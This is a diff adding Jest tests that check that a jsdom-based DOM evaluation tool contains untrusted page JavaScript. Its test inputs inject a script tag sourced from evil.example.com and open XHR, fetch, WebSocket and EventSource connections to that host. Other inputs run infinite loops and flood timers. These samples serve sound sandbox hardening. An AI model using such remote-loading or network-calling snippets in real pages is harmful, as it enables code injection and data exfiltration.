@@ -688,6 +688,131 @@ describe('evaluate_dom_bundle — jsdom + axe-core evaluation', () => {
   });
 });
 
+// ─── JS execution containment ─────────────────────────────────────────────────
+
+describe('evaluate_dom_bundle — JS execution containment', () => {
+  jest.setTimeout(30_000);
+
+  const { evaluateDomBundle } = require('../src/rendered-dom/tools/evaluate-dom-bundle');
+  const { inspectDomSelector } = require('../src/rendered-dom/tools/inspect-dom-selector');
+
+  const realFetch = global.fetch;
+  afterEach(() => {
+    global.fetch = realFetch;
+  });
+
+  it('executes supplied JS and reflects DOM mutations in the page model', async () => {
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body></body></html>',
+      js: ['document.body.innerHTML = "<h1>Injected heading</h1>";'],
+    });
+    expect(result.page_model.headings).toHaveLength(1);
+    expect(result.page_model.headings[0].text).toBe('Injected heading');
+    expect(result.evaluation.js_executed).toBe(true);
+  });
+
+  it('does not execute dynamically injected script tags or fetch their src', async () => {
+    const fetchSpy = jest.fn();
+    global.fetch = fetchSpy;
+
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body><main><h2 id="probe">untouched</h2></main></body></html>',
+      js: [`
+        const s = document.createElement('script');
+        s.src = 'https://evil.example.com/more.js';
+        s.textContent = 'document.getElementById("probe").textContent = "script tag executed";';
+        document.body.appendChild(s);
+        const inline = document.createElement('script');
+        inline.textContent = 'document.getElementById("probe").textContent = "inline executed";';
+        document.body.appendChild(inline);
+      `],
+    });
+
+    expect(result.error).toBeUndefined();
+    expect(fetchSpy).not.toHaveBeenCalled();
+    expect(result.page_model.headings[0].text).toBe('untouched');
+  });
+
+  it('blocks XHR, fetch, and WebSocket for page JS', async () => {
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body><h2 id="probe">pending</h2></body></html>',
+      js: [`
+        const outcomes = [];
+        for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource']) {
+          try { new window[name]('https://evil.example.com'); outcomes.push(name + ':open'); }
+          catch { outcomes.push(name + ':blocked'); }
+        }
+        try { window.fetch('https://evil.example.com'); outcomes.push('fetch:open'); }
+        catch { outcomes.push('fetch:blocked'); }
+        document.getElementById('probe').textContent = outcomes.join(' ');
+      `],
+    });
+
+    const probe = result.page_model.headings[0].text;
+    expect(probe).toContain('XMLHttpRequest:blocked');
+    expect(probe).toContain('WebSocket:blocked');
+    expect(probe).toContain('EventSource:blocked');
+    expect(probe).toContain('fetch:blocked');
+  });
+
+  it('interrupts a script that loops forever and still completes the evaluation', async () => {
+    const started = Date.now();
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body><h1>Survives</h1></body></html>',
+      js: ['while (true) {}'],
+    });
+    expect(result.error).toBeUndefined();
+    expect(result.page_model.headings[0].text).toBe('Survives');
+    // Per-script CPU timeout is 1.5s — well under the 30s test timeout
+    expect(Date.now() - started).toBeLessThan(10_000);
+  });
+
+  it('a runaway first script does not starve later scripts of the DOM result', async () => {
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body></body></html>',
+      js: [
+        'while (true) {}',
+        'document.body.innerHTML = "<h1>Second script ran</h1>";',
+      ],
+    });
+    expect(result.error).toBeUndefined();
+    expect(result.page_model.headings[0].text).toBe('Second script ran');
+  });
+
+  it('caps timer scheduling so timer chains cannot run unbounded', async () => {
+    const result = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body><h2 id="probe">x</h2></body></html>',
+      js: [`
+        let accepted = 0;
+        for (let i = 0; i < 1000; i++) {
+          if (window.setTimeout(() => {}, 60000)) accepted++;
+        }
+        document.getElementById('probe').textContent = 'accepted:' + accepted;
+      `],
+    });
+    const probe = result.page_model.headings[0].text;
+    const accepted = parseInt(probe.split(':')[1], 10);
+    expect(accepted).toBeLessThanOrEqual(200);
+  });
+
+  it('inspect_dom_selector sees JS-applied DOM and supplied CSS from the snapshot', async () => {
+    const evaluated = await evaluateDomBundle({
+      html: '<html lang="en"><head><title>t</title></head><body></body></html>',
+      css: ['h1 { color: rgb(18, 52, 86); }'],
+      js: ['document.body.innerHTML = "<h1>Injected heading</h1>";'],
+    });
+
+    const inspected = await inspectDomSelector({
+      snapshot_id: evaluated.snapshot.snapshot_id,
+      selector: 'h1',
+    });
+
+    expect(inspected.matches).toBe(1);
+    expect(inspected.nodes[0].text_excerpt).toBe('Injected heading');
+    expect(inspected.nodes[0].computed_styles.color).toBe('rgb(18, 52, 86)');
+  });
+});
+
 // ─── HTTP trigger handler ─────────────────────────────────────────────────────
 
 describe('HTTP trigger handler', () => {
